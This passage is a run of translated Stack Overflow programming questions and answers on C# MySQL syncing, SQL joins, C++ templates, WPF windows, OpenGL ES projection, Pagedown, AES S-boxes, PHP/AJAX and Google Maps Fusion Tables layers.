    private void Sincronizar(string miConexionRemota)
    {
        MySqlConnection miConexion = new MySqlConnection(miConexionRemota);
        miConexion.Open();
        MySqlCommand comando = new MySqlCommand();
        MySqlTransaction transaccion;

        // Empieza la transacción
        transaccion = miConexion.BeginTransaction(System.Data.IsolationLevel.ReadCommitted);
        comando.Transaction = transaccion;
        comando.Connection = miConexion;

        try
        {
            comando.CommandText = "UPDATE kiosco_remoto.empresas INNER JOIN kiosco_m.empresas ON kiosco_remoto.empresas.Id = kiosco_m.empresas.Id SET kiosco_remoto.empresas.direccion = kiosco_m.empresas.direccion";
            comando.ExecuteNonQuery();
            transaccion.Commit();
            MessageBox.Show("Se han sincronizado las BBDD correctamente.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (MySqlException ex)
        {
            transaccion.Rollback();
            MessageBox.Show(ex.Message, "Error al intentar sincronizar.", MessageBoxButtons.OK, MessageBoxIcon.Error);
            //throw ex;

        }
        finally
        {
            CargarDatosLocal();
            CargarDatosRemoto();
            miConexion.Close();
        }

    }

    /* * *
     * 
     * Eventos
     *
     * * */

    private void botonLocal_Click(object sender, EventArgs e)
    {
        CargarDatosLocal();
    }

    private void botonCargaDatosRemoto_Click(object sender, EventArgs e)
    {
        CargarDatosRemoto();
    }

    private void botonGrabarBDLocal_Click(object sender, EventArgs e)
    {
        try
        {
            builderLocal.GetUpdateCommand();
            dataAdapterLocal.Update(dataSetLocal, "empresas");
            CargarDatosLocal();
        }
        catch (NullReferenceException ex)
        {
            MessageBox.Show(ex.Message, "No hay ninguna BBDD abierta.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void botonGrabarBDRemota_Click(object sender, EventArgs e)
    {
        try
        {
            builderRemoto.GetUpdateCommand();
            dataAdapterRemota.Update(dataSetRemoto, "empresas");
            CargarDatosRemoto();
        }
        catch (NullReferenceException ex)
        {
            MessageBox.Show(ex.Message, "No hay ninguna BBDD abierta.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            conexionLocal.Close();
            conexionRemota.Close();

            if ((conexionLocal != null) || (conexionRemota != null))
            {
                MessageBox.Show("Se han cerrado todas las conexiones abiertas.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        catch
        {
            // No hago nada.
        }
    }

    private void botonSincro_Click(object sender, EventArgs e)
    {
        Sincronizar(stringConexionRemota);
    }      
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-20T11:35:35.950

遗憾的是，我不完全遵循您的代码，因为我不知道函数名称，但是是的，您可以打开两个或多个与 MySQL 的连接。

同步数据是一个棘手的问题，如果你想做一个单向同步，那么这并不难，但是如果你想要一个双向同步，那么你将不得不处理很多异常，以防出现重复数据。

如果你想从本地数据库获取数据到远程数据库，那么这样的事情会起作用：

```
string const query = "SELECT * FROM LocalTableName";
using (DbCommand sql =_MySQLConnection.CreateCommand()){
    sql.CommandText = query;
    using (DbDataReader row = sql.ExecuteReader()){
        // the data is sstored in row now upload to remote
        using (DbCommand sql_remote = _MySQLRemote.CreateCommand()){
            sql_remote.CommandText = "INSERT INTO RemoteTableName SET field1 = @p_field1";
            sql.Parameters.Add("@p_field1", row["field1"].toString());
            sql.ExecuteNonQuery();
            sql.Parameters.Clear();
        }
    }
} 
```

抱歉，它未经测试，可能有编码错误，因为我不在 VS 面前进行测试

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:18:25.893

您可以编写 DML 语句（INSERT's、UPDATE's、DELETE's）来合并同一服务器上的两个表，然后执行它们。

如果你想在两台不同的服务器上同步表，那么你应该从表中读取数据，在应用程序中分析数据，然后生成同步脚本。我可以说这项任务似乎很困难。

# sql - 一个需要创建复杂的sql语句

> ID：10757618
> 
> 赞同：-5
> 
> 时间：2012-05-25T15:52:59.687
> 
> 标签：sql, sqlite

我有两张桌子。

```
table A
id
isReachEnd 
```

* * *

```
table B
id
isFree 
```

我需要获取所有满足下一个标准的 id：

```
((A.id = B.id) AND (A.isReachEnd = 1) AND (B.isFree = 1)) 
```

我能怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:54:59.747

这一点都不复杂——事实上，它非常简单。查询将只是

```
SELECT * FROM a, b WHERE a.id = b.id AND a.isReachEnd = 1 AND b.isFree = 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:57:46.640

```
SELECT *
FROM A, B
WHERE A.id = B.id AND A.isReachEnd = 1 AND B.isFree = 1 
```

# c++ - iso c++ 禁止声明没有类型的泛型

> ID：10757623
> 
> 赞同：2
> 
> 时间：2012-05-25T15:53:28.123
> 
> 标签：c++, generics

我的母语是 C#，所以当我开始使用 C++ 时，我想为 C# 中可用的库使用者创建 get/set 糖语法。

所以我写...

```
template<typename T>
class GetProperty
{
    private:
        T (*get)();
    public:
        GetProperty(T (*get)())
        {
            this->get = get;
        }
        operator T()
        {
            return get();
        }
        template<typename S, typename T>
        GetProperty<S> operator=(GetProperty<T> fool)
        {
            throw 0;
        }
 }; 
```

然后，为了使用它，我编写了代码：

```
template<typename T>
class Vector
{
    private:
        struct LinkItem
        {
            public:
                T* Item;
                LinkItem* Next;
                                GetProperty<int> Length (&getLength);
                LinkItem(T* Item = NULL, int length = 1, LinkItem* Next = NULL)
                {
                    this->Item = Item;
                    this->length = length;
                    this->Next = Next;
                }
                LinkItem& operator =(LinkItem rhs)
                {
                    this->Item = rhs.Item;
                    this->length = rhs.length;
                    this->Next = rhs.Next;
                    return *this;
                }
            private:
                 int length;
                 int getLength()
                 {
                     return length;
                 }
        };
        LinkItem* current;
    .
    .
    .
}; 
```

但是，Netbeans 上的 C/C++ 添加（我相信这是 g++ 编译器）声称我正在实例化没有类型的 GetProperty。
根据谷歌搜索，如果有人忘记了 using 语句或包含标题等，就会发生这种情况。
但 int 是一个原语，所以这不可能。
这是怎么回事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:01:34.923

您正在构造 GetProperty 对象，同时在结构中声明它。这在 C++ 中是不允许的。您必须将构造移至构造函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T17:11:12.410

除了 VC++ 没有实现非静态数据成员初始化器这一事实之外，您不能将成员函数 getLength 视为`int (*)()`. 它的类型是`int (LinkItem::*)()`.

```
struct Foo {
    int foo(void) {return 1;}
};

int main() {
    int (*var)() = &Foo::foo; // Error
    int (Foo::*var)() = &Foo::foo; // Okay
} 
```

您可能不应该尝试像这样导入外国成语，但如果您真的想要，您可以尝试以下操作。（尽管正如 Nicol Bolas 指出的那样，您也可能不应该实现自己的链表，或者将其命名为“向量”。如果您正在学习 C++，只需学习 C++ 的方式，然后再去尝试重新发明事物。）

```
#include <functional>

template<typename T>
class GetProperty
{
private:
    std::function<int()> get;
public:
    GetProperty(std::function<int()> get)
        : get(get)
    {}
    operator T()
    {
        return get();
    }
};

template<typename T>
class Vector
{
private:
    struct LinkItem
    {
    public:
        T* Item;
        LinkItem* Next;
        GetProperty<int> Length;
        LinkItem(T* Item = NULL, int length = 1, LinkItem* Next = NULL)
            : Length([this] { return this->getLength(); })
        {
... 
```

# c# - 为什么关闭最后一个子窗口会最小化其父窗口？

> ID：10757625
> 
> 赞同：17
> 
> 时间：2012-05-25T15:53:31.430
> 
> 标签：c#, wpf

我有以下简单的 wpf 应用程序：

应用程序.xaml：

```
<Application x:Class="TestWpf2.App"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
</Application> 
```

应用程序.xaml.cs：

```
public partial class App : Application
{
    protected override void OnStartup(StartupEventArgs e)
    {
        var parentWindow = new Window();
        parentWindow.Show();

        var childWindow1 = new Window { Owner = parentWindow };
        childWindow1.Show();

        var childWindow2 = new Window { Owner = parentWindow };
        childWindow2.Show();
    }
} 
```

该应用程序导致 3 个窗口出现在屏幕上。如果您运行应用程序并关闭两个子窗口，则父窗口将最小化到任务栏。如果您注释掉`childWindow2.show()`、运行应用程序并关闭单个子窗口，则父窗口不会最小化到任务栏。

我可以添加以下代码来解决这个问题：

```
childWindow1.Closing += delegate(object sender, CancelEventArgs ex)
{
    (sender as Window).Owner = null;
}; 
```

但我不想使用这样的黑客，我想了解为什么会出现这个问题。

为什么会这样？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2017-06-13T13:17:17.327

**这是 WPF 未记录的功能（错误）**

此错误已在 7 多年前向 Microsoft 报告。

[非模态窗口顶部的模态对话框将主窗口向后发送。](https://connect.microsoft.com/VisualStudio/feedback/details/523197/modal-dialog-on-top-of-non-modal-window-sends-main-window-to-back)

> WPF 团队最近审查了此问题，并且不会解决此问题，因为此时团队正在关注影响最多 WPF 开发人员的错误。

让我们看一下这个未记录的特性的行为。

**它不会最小化，只是落后一个窗口（在调试模式下，在 Visual Studio 窗口后面）**

证明步骤：

*   运行此应用程序。

*   最小化所有其他窗口（例如：visual studio 和所有其他窗口）。在屏幕上只保留这三个窗口。

*   关闭两个孩子，父母仍处于`Normal`状态

测试此代码以进一步证明： `StateChange`不会触发。

```
 protected override void OnStartup(StartupEventArgs e)
        {
            var parentWindow = new Window() { Title = "Parent" };
            parentWindow.StateChanged += (sender, ep)=>
            {
                var state = ((Window)sender).WindowState;
            };
            parentWindow.Show();

            var childWindow1 = new Window { Owner = parentWindow, Title = "Child1" };
            childWindow1.Show();

            var childWindow2 = new Window { Owner = parentWindow, Title = "Child2" };
            childWindow2.Show();
        } 
```

**成为 TopMost 可以防止这种情况发生**

如果父窗口是 TopMost，则不会发生这种情况。但在许多情况下，这可能不是一个选择。

```
parentWindow.Topmost = true; 
```

**解决方法**

在 child2 关闭时激活父级。

```
childWindow2.Closed += (a, b) => { parentWindow.Activate(); }; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T17:28:16.780

这是因为一旦子窗口显示为所有者集，您就不能使用父窗口。只需在孩子在屏幕上时尝试访问父窗口，它不会让你明白我的意思。

如果您不指定所有者，则不会发生此行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-20T12:09:39.573

我从来没有弄清楚是什么导致了这种情况发生！最后，我写了这段代码，在任何子窗口关闭后调用：

```
// App inherits from Application, and has a Window property called MainWindow
// and a List<Window> property called OpenWindows.
if (!App.OpenWindows.Any())
    App.ParentWindow.Activate(); 
```

因此，如果最后一个子窗口关闭（设为`App.OpenWindows.Any()`假），则激活父窗口。这不会导致闪烁（例如，主窗口最小化然后最大化。）

这不是最好的解决方案。我不会关闭这个问题，希望有人能解释为什么 WPF 有这个功能！

# java - Android OpenGL ES 邻位奇怪的长宽比

> ID：10757628
> 
> 赞同：0
> 
> 时间：2012-05-25T15:53:40.337
> 
> 标签：java, android, opengl-es

我对 OpenGL ES 很陌生，我正在尝试绘制一些带纹理的四边形。我想保持它是二维的，所以我决定使用正交投影。我真正想要的是绘制一个平面，它在每个设备上占用相同的相对屏幕空间，而不管屏幕分辨率如何。

我遇到的问题是正交投影的设置。纵横比是不正确的。一个正方形在高度上被绘制为一个矩形。到目前为止，这是我的代码：

渲染器：

```
// automatically looped by android
public void onDrawFrame(GL10 gl) {
    // clear screen and buffer
    gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT); 

    // Draw elements
    for (GameObject object : level.getGameObjects()) {
        gl.glScalef(0.2f, 0.2f, 0.0f);
        object.draw(gl);
        gl.glLoadIdentity();
    }
}

public void onSurfaceChanged(GL10 gl, int width, int height) {
    gl.glViewport(0, 0, width, height);
    gl.glOrthof(0f, 480f, 0f, 800f, -1f, 1f);

}

public void onSurfaceCreated(GL10 gl, EGLConfig config) {
    // Load all textures
    for (GameObject object : level.getGameObjects()) {
        object.bindTexture(gl);
    }

    // Initialize game canvas
    gl.glEnable(GL10.GL_TEXTURE_2D); // Enable Texture Mapping
    gl.glClearColor(0.0f, 0.0f, 0.0f, 0.5f); // Black background

    // enable texture transparency
    gl.glEnable(GL10.GL_BLEND);
    gl.glBlendFunc(GL10.GL_SRC_ALPHA,   GL10.GL_ONE_MINUS_SRC_ALPHA);               
} 
```

绘制方法与本教程完全相同：http: [//obviam.net/index.php/texture-mapping-opengl-android-displaying-images-using-opengl-and-squares/](http://obviam.net/index.php/texture-mapping-opengl-android-displaying-images-using-opengl-and-squares/)

亲切的问候，大安

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T17:54:16.397

为什么要将宽度和高度硬编码为 glOrthof？你不应该使用传入的宽度和高度吗？

`gl.glOrthof(0f, width, 0f, height, -1f, 1f);`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T18:50:01.470

我找到了我的问题的答案。首先，我对宽度和高度进行了硬编码，这不是一个好的选择。为了在所有屏幕分辨率上固定，我现在计算纵横比，对于高度，我使用 with 乘以纵横比。

另一个问题是我在设置 glortho 之前没有重置投影矩阵。我已经改变了这一切，它解决了这个问题：

```
public void onSurfaceChanged(GL10 gl, int width, int height) {      
    gl.glViewport(0, 0, width, height);
    gl.glMatrixMode(GL10.GL_PROJECTION);
    gl.glLoadIdentity();
    gl.glOrthof(0f, 320, 0f, 320*aspect, -1f, 1f);
} 
```

我希望这对某人有帮助。

亲切的问候，大安

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-13T16:17:03.507

看起来你已经解决了。您能否提供有关如何计算方面变量的详细信息（也许是高度和宽度的划分？）正如仅供参考，传递给 onSurfaceChanged() 事件的高度和宽度值确实是动态的。例如，当您翻转屏幕方向时，它们会反转。我对此也比较陌生，但在我的桌面 gl 体验中，当窗口大小发生变化时将这些因素考虑在内很重要。

# javascript - 使用 Pagedown 我得到“未捕获的类型错误：无法读取属性 'attachEvent' of null”

> ID：10757630
> 
> 赞同：6
> 
> 时间：2012-05-25T15:53:55.723
> 
> 标签：javascript, pagedown

每当我用一个非常简单的示例加载页面时，我都会得到

> 未捕获的类型错误：无法读取 null 的属性“attachEvent”。Markdown.Editor.js:273

在我的 Chrome 控制台日志中。

在萤火虫我得到

```
elem is null [Break On This Error]  
if (elem.attachEvent) {
Markdo...itor.js (line 273) 
```

为什么我会收到这些错误，我该如何解决？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-25T15:53:56.050

看看[演示](http://code.google.com/p/pagedown/source/browse/demo/browser/demo.html)中的代码。

```
<script type="text/javascript">
  (function () {
    var converter1 = Markdown.getSanitizingConverter();
    var editor1 = new Markdown.Editor(converter1);
    editor1.run();
  } );
</script> 
```

看看它的位置？在身体的尽头。这意味着元素*已经*存在。但是，您可能在头脑中加载了这个 JavaScript。相反，将代码放在[.ready()](http://api.jquery.com/ready/)块中，或将其放回正文的末尾（或 DOM 中的 textarea 之后）。

# asp.net - 从字符串“UNITID、INSTNM、ADDR、CITY、STAB”到类型“整数”的转换无效

> ID：10757631
> 
> 赞同：-7
> 
> 时间：2012-05-25T15:53:56.080
> 
> 标签：asp.net, sql, vb.net

我收到错误：

```
InvalidCastException was unhandled by user code

Conversion from string "UNITID, INSTNM, ADDR, CITY, STAB" to type 'Integer' is not valid. 
```

## jcolebrand 编辑链接到一个要点，因为代码真的很长，请随意分叉：[https ://gist.github.com/2788975](https://gist.github.com/2788975)

该文件是进入 SQL 数据库的 .csv。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:12:28.693

我从错误消息和您的代码中注意到了几件事。我希望这可以帮助你。

1.  使用参数。[这是一些资源的链接](https://www.google.com/webhp?sourceid=chrome-instant&ie=UTF-8&ion=1#hl=en&sclient=psy-ab&q=vb.net%20parameterized%20query&oq=&aq=&aqi=&aql=&gs_l=&pbx=1&fp=2eea1a31cbf97609&ion=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&biw=1229&bih=828)
2.  您收到的具体错误与#1 有直接关系。该错误表明您正在尝试强制不兼容的数据类型。具体来说，它告诉您您正在尝试将特定字符串填充`"UNITID, INSTNM, ADDR, CITY, STAB"`到 Integer 列中。

鉴于我从您的架构中推断出的内容，这些实际上是列，因此您在此过程中缺少一些逗号。如果您要使用参数，它将 (a) 彻底清理代码，(b) 降低安全风险，(c) 迫使您清楚地了解您正在处理的数据类型。

# encryption - AES 替换框

> ID：10757633
> 
> 赞同：1
> 
> 时间：2012-05-25T15:53:56.407
> 
> 标签：encryption, cryptography, aes

我需要实现 AES（高级加密标准）。根据标准，在每一轮中，我使用 s-box 替换字节（例如：4F -> 84）。我的问题是我需要将 s-box 作为变量存储在我的 c++ 源代码中，还是可以为每个字节计算它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:08:24.110

S-Box 背后的想法是它在解密期间是可恢复的。因此，S-box 中的值是恒定的。为每个字节计算 S-box 是多余的并且是不必要的重复。

您应该复制并粘贴[现有表](https://gist.github.com/mb720/6662deb7bfbff28d080e4302196d16c2)或在开始时计算一次。[该](https://en.wikipedia.org/wiki/Rijndael_S-box)站点有 S-box 初始化的说明和一些示例。

# php - 如何通过单击链接或单选按钮或复选框来更改 php 中变量的值

> ID：10757636
> 
> 赞同：1
> 
> 时间：2012-05-25T15:54:07.400
> 
> 标签：php

我正在用 php 创建一个系统来获取用户对解决方案的反馈。我正在使用 MySQL 来获取解决方案并存储反馈。反馈是整数。有两列用于反馈-是和否。当用户单击文本链接/单选按钮或复选框时，我想增加它们的值。喜欢- ..................解决方案........这对您有帮助吗？是/否

当用户点击 Yes 时，它应该将 yes 列的值增加一，如果它点击 No，它应该将 no 列的值增加一。主要困难在于该页面包含许多解决方案和反馈选项。您能帮帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:01:28.853

单击页面上的表单控件是客户端操作。在 PHP 中更新变量是一种服务器端操作。幸运的是，AJAX 为我们提供了一种从客户端访问服务器资源的方法。

以下代码使用 jQuery JavaScript 库执行 AJAX 请求。您不需要 jQuery 来执行 AJAX 请求，但是您必须对您的 AJAX 请求进行本地编码。这样做并不难，但也不是微不足道的。

JavaScript：

```
$.ajax({
    url: '/path/to/file.php',
    data: 'url=encoded&query=string', // Can also be an object
    success: function( output ) {
        // This function gets called once the AJAX Request returns.  It is sent 
        // a string parameter containing all output of the Server-side script
    }
}); 
```

在 中`file.php`，您只需执行您想要执行的任何操作。AJAX 请求可以通过 GET 或 POST 发送，传递的任何变量都将分别在`$_GET`和`$_POST`superglobals 中可用。

传入的`output`参数是一个字符串，并且是从服务器端脚本生成的所有输出（即`echo`/ ）。`print`该字符串也可以是对象的[JSON 表示形式](http://php.net/manual/en/function.json-encode.php)，在这种情况下，您必须[解析字符串](http://www.json.org/js.html)才能将其用作 JavaScript 中的对象。如果您的服务器端脚本返回大量数据而不仅仅是纯 HTML/XHTML，这将非常有用。

有关更多信息，请查看 jQuery 的[AJAX 文档](http://api.jquery.com/jQuery.ajax/)或 Google 的[原生 ajax 请求](http://www.google.com/search?q=jquery%20ajax&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla%3aen-US%3aofficial&client=firefox-a#hl=en&client=firefox-a&hs=m7x&rls=org.mozilla%3aen-US%3aofficial&sclient=psy-ab&q=native%20ajax%20requests&oq=native%20ajax%20requests&aq=f&aqi=g1g-bK1&aql=&gs_l=serp.3..0j0i8i30.9117.11446.0.11497.20.17.0.0.0.0.265.2082.7j5j4.16.0...0.0.IWRcBvLgphw&pbx=1&bav=on.2,or.r_gc.r_pw.r_qf.,cf.osb&fp=c906f5821a52c92b&biw=1680&bih=946)

另一种方法是将您的控件作为常规表单元素，当它们被按下时提交表单（例如，它们中的每一个都是命名的提交按钮/图像输入）。您的表单处理程序将根据`$_POST`. 然后，此方法会将用户输入发送到表单处理程序，该处理程序在服务器上执行，然后在完成处理后将用户重定向回页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:58:28.073

PHP 只是服务器端，因此当用户单击“是”时，它需要发送一个请求以加载新页面、一个 Ajax 请求等，然后更新服务器。页面加载后在页面上所做的任何事情都不能用 PHP 完成。

我会将 $_POST/$_GET 请求附加到每个链接/单选按钮，然后在页面刷新或类似的情况下发送到 MySQL 以更新您的表。

# javascript - 如何使用 Google Maps API v3 和 Fusion Tables 打开/关闭图层？

> ID：10757640
> 
> 赞同：4
> 
> 时间：2012-05-25T15:54:33.817
> 
> 标签：javascript, google-maps, google-maps-api-3, google-fusion-tables

我正在尝试制作具有多个融合表图层的地图。每个融合表层将显示特定年份与卡特尔相关的凶杀案数量（包括所有年份的总和）。由于每一层都有相同的几何图形，我需要让用户一次查看一层。有没有办法使用单选按钮打开/关闭每一层？我已经搜索了几个小时的教程或示例，但都是空的，所以我希望这里有人可以提供帮助。

这是地图副本的链接：[https ://mywebspace.wisc.edu/csterling/web/cartel%20map/index%20-%20practice.html](https://mywebspace.wisc.edu/csterling/web/cartel%20map/index%20-%20practice.html)

这是代码（对不起格式）

```
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=AIzaSyDRngi4TwTlx3r9zRXxIGzbSAq6OcEpxjA&sensor=false"></script>
<link rel='stylesheet' href='stylesheet.css' />
<script type="text/javascript" src="script.js"></script>

<script type='text/javascript'>

window.onload = function () {

    var oceanStyle = [
        {
         featureType: "ocean",
         stylers: [
            { saturation: -100 }
            ]
        },
        {
         featureType: "all",
         elementType: "labels",
         stylers: [
         { visibility: "off"}
         ]
         }

    ];

    var oceanMapType = new google.maps.StyledMapType(oceanStyle, 
        {name: "Grayscale"});

    var myLatlng = new google.maps.LatLng(0,0);

    var mapOptions = {
        center: new google.maps.LatLng(24,-103),
        zoom: 5,
        //mapTypeId: google.maps.MapTypeId.HYBRID,
        mapTypeControl: true,
        mapTypeControlOptions: {                
            position: google.maps.ControlPosition.RIGHT_TOP,
            mapTypeIds: [google.maps.MapTypeId.HYBRID, 'Grayscale']
            },

        panControl: false,
        streetViewControl: false,
        zoomControl: true,
        zoomControlOptions: {
            style: google.maps.ZoomControlStyle.SMALL

        }
        };                  

    var map = new google.maps.Map(document.getElementById("mymap"), mapOptions);

    map.mapTypes.set('Grayscale',oceanMapType);
    map.setMapTypeId('Grayscale');

    var layer1 = new google.maps.FusionTablesLayer({
        query:{
            select: 'unique_id',
            from: '3943497'
        },
        map: map

    });

        /*
    var layer2 = new google.maps.FusionTablesLayer({

        query:{
            select: 'unique_id',
            from: '3962564'         
        },
        map: map

    }); */

    }

</script>
</head>
<body>
  <div id='mymap'></div> 
```

#

编辑

#

好，我知道了！这是我的代码，以防其他人有同样的问题：

```
<html>

<head>

<!-- <script src='http://maps.google.com/maps/api/js?sensor=false' type='text/javascript'></script> -->

<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=AIzaSyDRngi4TwTlx3r9zRXxIGzbSAq6OcEpxjA&sensor=false"></script>

<link rel='stylesheet' href='stylesheet.css' /> 
```

```
var map;

//var layArray = [];

var shownLayer;

var layer_sum;

var layer_2007;

var layer_2008;

var layer_2009;

var layer_2010;

function toggleLayer(this_layer){

    shownLayer.setMap(null);

    this_layer.setMap(map);

    shownLayer = this_layer;

    /*if ( this_layer.getMap() ) {

        this_layer.setMap(null);

    }else{

        this_layer.setMap(map);

    }*/ 

}

 window.onload = function () {

    var oceanStyle = [

        {

         featureType: "ocean",

         stylers: [

            { saturation: -100 }

            ]

        },

        {

         featureType: "all",

         elementType: "labels",

         stylers: [

         { visibility: "off"}

         ]

         }

    ];

    var oceanMapType = new google.maps.StyledMapType(oceanStyle, 

        {name: "Grayscale"});

    var myLatlng = new google.maps.LatLng(0,0);

    var mapOptions = {

        center: new google.maps.LatLng(24,-103),

        zoom: 6,

        //mapTypeId: google.maps.MapTypeId.HYBRID,

        mapTypeControl: true,

        mapTypeControlOptions: {                

            position: google.maps.ControlPosition.RIGHT_TOP,

            mapTypeIds: [google.maps.MapTypeId.HYBRID, 'Grayscale']

            },

        panControl: true,

        streetViewControl: false,

        zoomControl: true,

        zoomControlOptions: {

            style: google.maps.ZoomControlStyle.SMALL

        }

        };                  

    map = new google.maps.Map(document.getElementById("mymap"), mapOptions);

    map.mapTypes.set('Grayscale',oceanMapType);

    map.setMapTypeId('Grayscale');

    layer_sum = new google.maps.FusionTablesLayer({

        query:{

            select: 'unique_id',

            from: '3943497'

        },      

    }); 

    layer_2007 = new google.maps.FusionTablesLayer({

        query:{

            select: 'unique_id',

            from: '3962564'         

        },          

    }); 

    layer_2008 = new google.maps.FusionTablesLayer({

        query:{

            select: '2008',

            from: '3962469'

        },

    });

    layer_2009 = new google.maps.FusionTablesLayer({

        query: {

            select: '2009',

            from: '3964318'             

        },

    });

    layer_2010 = new google.maps.FusionTablesLayer({

        query: {

            select: '2010',

            from: '3964517'

        },

    });

    layer_sum.setMap(map);

    shownLayer = layer_sum;

    }

</script>

</head>

<body>    

  <div id='mymap'></div>    

  <div id='map-optionbar-r'>        

    Sum of Homicides<input name="layers" type="radio" value="layer_sum" onClick="toggleLayer(layer_sum);" checked><br />

    Homicides - 2007<input name="layers" type="radio" value="layer_2007" onClick="toggleLayer(layer_2007);"><br />

    Homicides - 2008<input name="layers" type="radio" value="layer_2008" onClick="toggleLayer(layer_2008);"><br />

    Homicides - 2009<input name="layers" type="radio" value="layer_2009" onClick="toggleLayer(layer_2009);"><br />

    Homicides - 2010<input name="layers" type="radio" value="layer_2010" onClick="toggleLayer(layer_2010);"><br />

  </div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-25T18:50:35.310

```
toggleLayer(layer1);
// make sure your map is a global
function toggleLayer(this_layer)
{
   if( this_layer.getMap() ){
        this_layer.setMap(null);
   }else{
        this_layer.setMap(map);
   }
}
</head>
<body>
<br />
Layer 1<input name="layers" type="radio" value="layer1" onClick="toggleLayer(layer1);"><br />
Layer 2<input name="layers" type="radio" value="layer2" onClick="toggleLayer(layer2);"><br /> 
```

**更新**

```
 <script type='text/javascript'>
    var map, layer1, layer2;
  google.load("maps", "3", {other_params:"sensor=false"});
 window.onload = function () {

    var oceanStyle = [
        {
         featureType: "ocean",
         stylers: [
            { saturation: -100 }
            ]
        },
        {
         featureType: "all",
         elementType: "labels",
         stylers: [
         { visibility: "off"}
         ]
         }

    ];

    var oceanMapType = new google.maps.StyledMapType(oceanStyle, 
        {name: "Grayscale"});

    var myLatlng = new google.maps.LatLng(0,0);

    var mapOptions = {
        center: new google.maps.LatLng(24,-103),
        zoom: 5,
        //mapTypeId: google.maps.MapTypeId.HYBRID,
        mapTypeControl: true,
        mapTypeControlOptions: {                
            position: google.maps.ControlPosition.RIGHT_TOP,
            mapTypeIds: [google.maps.MapTypeId.HYBRID, 'Grayscale']
            },

        panControl: false,
        streetViewControl: false,
        zoomControl: false,
        zoomControlOptions: {
            style: google.maps.ZoomControlStyle.SMALL

        }
    };                  

    map = new google.maps.Map(document.getElementById("mymap"), mapOptions);

    map.mapTypes.set('Grayscale',oceanMapType);
    map.setMapTypeId('Grayscale');

    layer1 = new google.maps.FusionTablesLayer({
        query:{
            select: 'unique_id',
            from: '3943497'
        },
        //map: map

    }); 

    layer2 = new google.maps.FusionTablesLayer({

        query:{
            select: 'unique_id',
            from: '3962564'         
        }
        //map: map

    }); 

    // may need to remove this line
    //layer1.setMap(map);

    }

    function old_toggleLayer(this_layer){
        if ( this_layer.getMap() ) {
            this_layer.setMap(null);
        }else{
            this_layer.setMap(map);
        }

    }

    function toggleLayer(this_layer){
        layer1.setMap(null);
        layer2.setMap(null);
        this_layer.setMap(map);

    }

</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:33:23.563

请参阅[结合其他选择打开/关闭天气层](https://stackoverflow.com/questions/10335194/turning-weather-layer-on-off-combined-with-other-selections)；我为天气/云层做了这个（在肖恩的超级帮助下）。我想你可以用同样的方式打开/关闭所有其他层，因为我也激活了 FT 层。只需撕下我的代码并对其进行调整。干杯! 坦率

# java - Java 日期对象：夏令时

> ID：10757642
> 
> 赞同：0
> 
> 时间：2012-05-25T15:54:34.473
> 
> 标签：java, datetime, date, timezone, dst

我有一个基于客户端-服务器的 java 应用程序。客户端在美国/太平洋时区运行，服务器在 UTC（我在 UTC 中保存数据库中的时间）

因此，例如，如果我将日期保存为太平洋时间 09:00 小时，它将在数据库中保存为 UTC 时间 14:00 小时。

当我从 DB 读回这个时间时，夏令时被应用，现在它被转换为太平洋时间 08:00，而不是 09:00。

因此，从太平洋时间转换为 UTC 时，不考虑夏令时，但从 UTC 转换回太平洋时，应用的时间不一致。

在 DB 中，列类型是 TIME，而在 java 中，我将其读入日期对象。

我该如何处理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:14:30.390

我认为你能做的最好的事情是确保尽可能多的时间处理完全不受时区影响。例如，自 Unix 纪元以来的毫秒。然后，您仅在将时区数据显示给用户之前应用它。

因此，在这种情况下，当您向服务器报告和从服务器检索时，不要应用任何本地时间假设。这样，就不可能对数据进行不匹配的时区或 DST 处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:09:48.413

通常，数据库服务器决定时间、是否应用夏令时以及时区，UTC 是标准。

建议：

1.  也许您想将客户端的时间设置为一个字符串字段，另一个字段用于 PST、EST 或其他时区。
2.  为时区创建一个字段，并计算显示给客户端的时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T17:40:14.483

除了所有这些，我建议您`getLong`手动使用并自己构造 Date 对象。

# ajax - 如何将 RadWindow 从 ContentPage 添加到 MasterPage 中的 RadWindowManager？

> ID：10757644
> 
> 赞同：1
> 
> 时间：2012-05-25T15:54:41.510
> 
> 标签：ajax, telerik, radwindow

我在 MasterPage (MasterPage.aspx) 中有 RadWindowManager：

```
